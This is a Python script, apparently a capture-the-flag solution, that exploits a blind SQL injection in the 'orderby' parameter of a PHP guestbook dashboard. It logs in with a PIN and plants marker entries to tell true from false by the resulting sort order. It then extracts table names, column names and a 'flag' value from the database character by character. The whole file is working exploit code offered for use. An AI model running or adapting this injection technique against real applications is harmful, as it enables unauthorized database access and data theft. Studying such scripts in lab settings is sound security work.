import sys
import re
import requests
from html import unescape

BASE = sys.argv[1].rstrip("/")
PIN = sys.argv[2]

s = requests.Session()

MARKERS = ['aaaaa', 'zzzzz']

def login():
    r = s.post(
        f"{BASE}/index.php",
        data={"pin": PIN},
        allow_redirects=True,
        timeout=10,
    )
    print("[+] login:", r.status_code)

def add_entry(name):
    r = s.post(
        f"{BASE}/dashboard.php",
        data={
            "action": "add_entry",
            "name": name,
            "email": "",
            "message": "",
        },
        allow_redirects=True,
        timeout=10,
    )
    print("[+] add:", name, r.status_code)

def get(orderby):
    r = s.get(
        f"{BASE}/dashboard.php",
        params={"orderby": orderby, "order": "ASC"},
        allow_redirects=True,
        timeout=10,
    )
    return unescape(r.text)

def signature(orderby):
    html = get(orderby)
    names = [
        x.strip()
        for x in re.findall(
            r'<div class="entry-name">\s*([^<]+?)\s*</div>',
            html,
            flags=re.I | re.S,
        )
    ]

    sig = tuple(x for x in names if x in MARKERS)

    if len(sig) != len(MARKERS):
        print("[!] markers not found correctly")
        print("[!] expected:", MARKERS)
        print("[!] found names:", names[:20])
        raise RuntimeError("marker parse failed")

    return sig

def cond_true(cond):
    payload = f"RAND(IF(({cond}),1,2))"
    sig = signature(payload)

    if sig == sig_true:
        return True
    if sig == sig_false:
        return False

    raise RuntimeError(f"unknown signature: {sig}")

def dump_expr(expr, max_len=100):
    out = ""

    for pos in range(1, max_len + 1):
        ascii_expr = f"ASCII(SUBSTR(({expr}),{pos},1))"

        if not cond_true(f"{ascii_expr}>0"):
            break

        lo, hi = 1, 126
        while lo < hi:
            mid = (lo + hi) // 2

            if cond_true(f"{ascii_expr}>{mid}"):
                lo = mid + 1
            else:
                hi = mid

        out += chr(lo)
        print(out, end="\r", flush=True)

    print()
    return out

login()

add_entry('aaaaa')
add_entry('zzzzz')

sig_true = signature("RAND(1)")
sig_false = signature("RAND(2)")
print("[+] marker A:", 'aaaaa')
print("[+] marker Z:", 'zzzzz')
print("[+] true sig :", sig_true)
print("[+] false sig:", sig_false)

if sig_true == sig_false:
    raise RuntimeError("RAND(1) and RAND(2) same order, rerun script")

def hx(s):
    return "0x" + s.encode().hex()

# db = dump_expr("DATABASE()", 100)
# print("[+] database:", db)

tables = dump_expr(
    "SELECT(GROUP_CONCAT(table_name))"
    "FROM(information_schema.tables)"
    "WHERE(table_schema=DATABASE())",
    200,
)
print("[+] tables:", tables)

cols = dump_expr(
    "SELECT(GROUP_CONCAT(column_name))"
    "FROM(information_schema.columns)"
    f"WHERE((table_schema=DATABASE())AND(table_name={hx('secrets')}))", # 轉成 hex 避免引號問題
    200,
)
print(f"[+] secrets: {cols}")

# 找到 secrets table 和 flag column 後再用
flag = dump_expr("SELECT(GROUP_CONCAT(flag))FROM(secrets)", 100)
print("[+] flag:", flag)